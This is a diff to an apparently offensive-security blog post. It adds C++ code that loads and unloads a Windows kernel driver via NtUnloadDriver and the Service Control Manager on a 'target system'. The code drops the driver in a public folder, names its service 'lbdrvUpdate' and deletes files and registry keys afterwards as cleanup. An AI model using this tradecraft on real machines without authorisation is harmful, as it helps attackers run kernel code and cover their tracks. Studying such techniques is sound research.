@@ -245,7 +245,104 @@ void loadDriver()
 
 ### Unloading and Performing Cleanup With /UNLOAD
 
+We can unload the driver when we are finished with the target system by calling the cousin function to NtLoadDriver, NtUnloadDriver. Calling this function is done by resolving the function address and then calling it while passing the location in the Registry that we set earlier. Also it's good practice to perform some cleanup, so this function should delete the dropped files on disk and delete the created Registry key values.
+
+```c++
+void unloadDriver()
+{
+	enableSeLoadDriverPrivilege();
+	NT_UNLOAD_DRIVER NtUnloadDriver = (NT_UNLOAD_DRIVER)GetProcAddress(pNtdll, "NtUnloadDriver");
+	UNICODE_STRING DriverServiceName = { 0 };
+
+	WCHAR regNamePath[MAX_PATH] = L"\\Registry\\Machine\\System\\CurrentControlSet\\Services\\lbdrv";
+	RtlInitUnicodeString(&DriverServiceName, regNamePath);
+
+	NTSTATUS unloadDrvStatus = NtUnloadDriver(&DriverServiceName);
+	if (unloadDrvStatus == ERROR_SUCCESS)
+	{
+		printf("\n[+] Sucessfully unloaded the driver from the kernel\n");
+
+		LPCWSTR delRegNamePath = L"System\\CurrentControlSet\\Services\\lbdrv";
+		LSTATUS delKey = SHDeleteKeyW(HKEY_LOCAL_MACHINE, delRegNamePath);
+		if (delKey == ERROR_SUCCESS)
+		{
+			BOOL delFile = DeleteFile(L"C:\\Users\\Public\\lbdrv.sys");
+			if (delFile != 0)
+			{
+				printf("[+] Performed cleanup, removed keys and files from disk\n");
+			}
+		}
+	}
+}
+```
+
 ![image](https://user-images.githubusercontent.com/70239991/125891748-21541df3-14db-4e1f-a8ee-9092372bafc3.png)
+
+### Alternatively Loading a Driver With the SCM
+
+This technique is very well know so this post won't focus on the details too much. When you load a driver, normally people make use of the `sc.exe` command or publically available tools such as OsrLoader. This tools make API calls to the Windows Service Control Manager (SCM) to load new drivers as services. We can directly interact with the SCM via the API functions `OpenSCManager`, `CreateServiceA`, `StartService`, and `CloseServiceHandle`, to perform this action in a more "manual" way.
+
+```c++
+void loadDriverSCM()
+{
+	dropDriverResourceToDisk();
+
+	LPCSTR lpBinaryPathName = "C:\\Users\\Public\\lbdrv.sys";
+	SC_HANDLE hService = OpenSCManager(NULL, NULL, SC_MANAGER_ALL_ACCESS);
+	if (hService != 0)
+	{
+		LPCSTR lpServiceName = "lbdrvUpdate";
+		SC_HANDLE createService = CreateServiceA(hService, lpServiceName, lpServiceName,
+			SERVICE_ALL_ACCESS,
+			SERVICE_KERNEL_DRIVER,
+			SERVICE_DEMAND_START,
+			SERVICE_ERROR_IGNORE,
+			lpBinaryPathName,
+			NULL, NULL, NULL, NULL, NULL);
+
+		if (createService)
+		{
+			BOOL startService = StartService(createService, 0, NULL);
+			if (startService)
+			{
+				printf("[+] Sucessfully created a new service for the driver\n");
+			}
+		}
+		CloseServiceHandle(createService);
+	}
+	CloseServiceHandle(hService);
+	DeleteFileA(lpBinaryPathName);
+}
+```
+
+To unload the driver from the system, you simply need to call `ControlService` with the `SERVICE_CONTROL_STOP` control code and then call `DeleteService` with a handle obtained from `OpenServiceA` to the target service.
+
+```c++
+void unloadDriverSCM()
+{
+	SC_HANDLE openSCM = OpenSCManager(NULL, NULL, SC_MANAGER_ALL_ACCESS);
+	if (openSCM != NULL)
+	{
+		LPCSTR lpServiceName = "lbdrvUpdate";
+		SC_HANDLE openService = OpenServiceA(openSCM, lpServiceName, SC_MANAGER_ALL_ACCESS);
+		if (openService != NULL)
+		{
+			SERVICE_STATUS sstatus;
+			BOOL stopService = ControlService(openService, SERVICE_CONTROL_STOP, &sstatus);
+			if (stopService != 0)
+			{
+				BOOL delService = DeleteService(openService);
+				if (delService != 0)
+				{
+					printf("[+] Sucessfully deleted the driver service\n");
+				}
+			}
+		}
+		CloseServiceHandle(openService);
+	}
+	CloseServiceHandle(openSCM);
+}
+```
 
 ## Conclusion
 
